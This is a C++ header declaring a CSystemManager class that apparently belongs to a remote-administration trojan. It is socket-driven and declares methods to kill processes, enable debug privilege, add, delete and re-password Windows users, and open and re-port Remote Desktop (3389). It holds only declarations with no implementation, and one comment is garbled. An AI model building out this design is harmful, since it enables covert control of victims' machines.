// SystemManager.h: interface for the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SYSTEMMANAGER_H__5E44B060_837A_4D2D_9E75_E4A33E51CAE1__INCLUDED_)
#define AFX_SYSTEMMANAGER_H__5E44B060_837A_4D2D_9E75_E4A33E51CAE1__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000


#include "..\Manager.h"

class CSystemManager : public CManager  
{
public:
	CSystemManager(CClientSocket *pClient);
	virtual ~CSystemManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	static BOOL DebugPrivilege(const char *PName,BOOL bEnable);
	static void ShutdownWindows(DWORD dwReason);
	static bool CALLBACK EnumWindowsProc( HWND hwnd, LPARAM lParam);
private:
	LPBYTE getProcessList();
	LPBYTE getWindowsList();
	LPBYTE getSoftWareList();

	void SendProcessList();
	void SendWindowsList();
//	void SendDialupassList();
	void SendSoftWareList();

	void KillProcess(LPBYTE lpBuffer, UINT nSize);
	void TestWindow(LPBYTE lpBuffer);
	void CloseWindow(LPBYTE lpBuffer);

	
	void SendSysInfoList();
	void GetSystemInfo(tagSystemInfo* pSysInfo);
	
	void SendSysUserList();
	LPBYTE getSysUserList();
	
	void SendUserStateList();
	LPBYTE getUserStateList();

	void ChangeUserState(LPBYTE lpBuffer, UINT nSize , UINT User_kt);  //’ ªß∆Ù”√ Õ£÷π
	void ChangeUserPass(LPBYTE lpBuffer, UINT nSize);
	void DeleteUser(LPBYTE lpBuffer, UINT nSize);
	void DisconnectUser(LPBYTE lpBuffer, UINT nSize);
	void LogOffUser(LPBYTE lpBuffer, UINT nSize);
	void NoNetAddUser(LPBYTE lpBuffer, UINT nSize);
	BOOL Change3389Port(LPVOID lparam);
	void Open3389();
	void GetTermsrvFile();
	BOOL WriteTermsrv(LPBYTE lpBuffer, UINT nSize);

	HANDLE hSendMemoryThread;
	static DWORD WINAPI SendCPUAndMemoryThread(LPVOID lparam);

};

#endif // !defined(AFX_SYSTEMMANAGER_H__5E44B060_837A_4D2D_9E75_E4A33E51CAE1__INCLUDED_)
